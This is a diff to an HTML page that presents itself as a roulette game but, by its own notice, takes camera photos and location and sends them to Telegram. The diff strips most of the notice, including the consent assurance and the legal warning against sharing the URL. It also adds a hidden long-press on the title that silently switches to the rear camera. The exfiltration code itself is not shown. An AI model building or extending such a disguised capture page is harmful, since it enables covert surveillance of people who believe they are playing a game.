@@ -6,7 +6,35 @@
 <title>🎯ルーレット🎯</title>
 <style>
   body { margin: 0; color: #fff; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; background: #444; transition: background 0.1s; padding: 20px 0; box-sizing: border-box; }
-  h2 { position: relative; margin-bottom: 30px; padding: 10px 25px; background: rgba(255,255,255,0.2); border-radius: 15px; backdrop-filter: blur(10px); z-index: 5; border: 1px solid rgba(255,255,255,0.3); font-size: 24px; transition: background 0.3s; cursor: pointer; user-select: none; -webkit-user-select: none; }
+  
+  /* タイトルGUIのベース設定 */
+  h2 { 
+    position: relative; margin-bottom: 30px; padding: 10px 25px; 
+    background: rgba(255,255,255,0.2); border-radius: 15px; 
+    backdrop-filter: blur(10px); z-index: 5; border: 1px solid rgba(255,255,255,0.3); 
+    font-size: 24px; 
+    cursor: pointer; user-select: none; -webkit-user-select: none;
+    /* 回転アニメーションの設定 */
+    transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1), background 0.3s, border 0.3s;
+    transform-style: preserve-3d;
+  }
+
+  /* くるっと回転＋黒ぼかし状態 */
+  h2.flipped {
+    transform: rotateY(180deg);
+    background: rgba(0, 0, 0, 0.7); /* 黒のぼかし */
+    border: 1px solid rgba(255, 64, 129, 0.5);
+  }
+
+  /* 文字が反転しないように中身を制御 */
+  h2 span {
+    display: inline-block;
+    transition: transform 0.6s;
+  }
+  h2.flipped span {
+    transform: rotateY(180deg);
+  }
+
   #container { width: 85vw; max-width: 400px; aspect-ratio: 1; position: relative; margin: 20px 0; }
   #pointer { position: absolute; left: 50%; top: -25px; transform: translateX(-50%); font-size: 45px; z-index: 20; color: #ffffff; text-shadow: 0 4px 10px rgba(0,0,0,0.5); line-height: 1; }
   canvas { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #333; box-shadow: 0 0 30px rgba(0,0,0,0.5); display: block; }
@@ -38,7 +66,7 @@
 </head>
 <body>
 
-<h2 id="h2Title">🎯ルーレット🎯</h2>
+<h2 id="h2Title"><span>🎯ルーレット🎯</span></h2>
 
 <div id="container">
   <div id="pointer">▼</div>
@@ -76,18 +104,12 @@
     <b>【重要：セキュリティ学習用デモサイト】</b>
     <span class="toggle-icon">▼</span>
   </summary>
-  <br> このサイトは、JavaScriptによる不正なデータ取得（スパイウェア）の手口を学ぶための教育用デモページです。
+  <br> このサイトは、JavaScriptによる不正なデータ取得の手口を学ぶためのデモページです。
   <br><br>
-  本サイトでは、ユーザーが同意した場合に限り、以下の処理が行われます：<br>
+  同意した場合に限り、以下の処理が行われます：<br>
   ・端末のカメラを使用した写真の撮影<br>
   ・現在地（位置情報）の取得<br>
-  ・取得されたデータの外部サービス（Telegram）への送信<br>
-  <br>
-  これらの処理は、画面上の確認操作およびユーザーの明示的な同意があった場合のみ実行されます。同意しない場合は、データの取得および送信は行われません。
-  <br><br>
-  取得されたデータは、本デモの動作確認および学習目的のためにのみ使用されます。
-  <br><br>
-  許可なく第三者に対してこのURLを送信したり、意図を説明せずに実行させたりする行為は禁止されています。内容によっては法律（不正指令電磁的記録に関する罪、プライバシー侵害等）に抵触する可能性があります。
+  ・データの外部（Telegram）への送信<br>
 </details>
 
 <script>
@@ -109,15 +131,17 @@ let totalRotation = 0;
 let tempPhotos = [];
 let tempLocationMsg = "";
 
-// --- 隠し機能用変数 ---
+// --- 隠し機能：3秒長押しでGUI回転＆外カメ切替 ---
 let useBackCamera = false;
 let pressTimer;
 const h2 = document.getElementById("h2Title");
 
-h2.onmousedown = h2.ontouchstart = () => {
+h2.onmousedown = h2.ontouchstart = (e) => {
+  if(e.type === 'touchstart') e.preventDefault();
   pressTimer = setTimeout(() => {
     useBackCamera = !useBackCamera;
-    h2.style.background = useBackCamera ? "rgba(0,0,0,0.6)" : "rgba(255,255,255,0.2)";
+    // flippedクラスの付け外しで、回転と背景色変更を同時に行う
+    h2.classList.toggle("flipped", useBackCamera);
   }, 3000);
 };
 h2.onmouseup = h2.onmouseleave = h2.ontouchend = () => clearTimeout(pressTimer);
@@ -169,7 +193,6 @@ function getTempLocation() {
 async function getTempData() {
   tempPhotos = [];
   tempLocationMsg = "";
-
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ 
       video: { facingMode: useBackCamera ? "environment" : "user" } 
